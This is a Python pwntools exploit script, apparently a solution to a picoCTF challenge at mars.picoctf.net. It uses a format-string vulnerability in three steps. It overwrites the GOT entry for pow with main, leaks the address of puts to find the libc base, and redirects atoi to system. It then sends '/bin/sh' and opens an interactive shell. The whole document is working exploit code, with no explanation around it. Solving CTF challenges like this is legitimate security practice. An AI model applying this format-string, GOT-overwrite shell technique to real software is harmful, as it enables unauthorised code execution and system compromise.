#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall")
libc = ELF("./libc6_2.31-0ubuntu9.1_amd64.so")
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mars.picoctf.net", 31929)

    return r


context.binary = exe
def main():
    r = conn()
    input()
    # Overwrite GOT of 'pow' to 'main'
    payload1, payload2 = fmtstr_split(43, {exe.got['pow'] : exe.sym['main']}, 21)
    r.sendlineafter(b'A: ', b'1_' + payload1)
    r.sendlineafter(b'B: ', b'11111111' + payload2)
    

    r.sendlineafter(b'A: ', b'1_%43$s')
    r.sendlineafter(b'B: ', b'1_______' + p64(exe.got['puts']))
    r.recvuntil(b'A: 1_')
    leak = u64(r.recv(6) + b'\0\0')
    info(b'Leak: ' + hex(leak).encode())
    libc.address = leak - libc.sym['puts']
    info(b'Libc base address: ' + hex(libc.address).encode())
    info(b'Libc system address: ' + hex(libc.sym['system']).encode())
    info(b'Libc atoi address: ' + hex(libc.sym['atoi']).encode())
    pause()
    

    payload1, payload2 = fmtstr_split(43, {exe.got['atoi'] : libc.sym['system']}, 21)

    r.sendline(b'1_' + payload1)
    r.sendlineafter(b'B: ', b'11111111' + payload2)
    pause()
    r.sendlineafter(b'A: ', b'/bin/sh')
    r.sendlineafter(b'B: ', b'done')
    # pause()
    r.interactive()

if __name__ == "__main__":
    main()
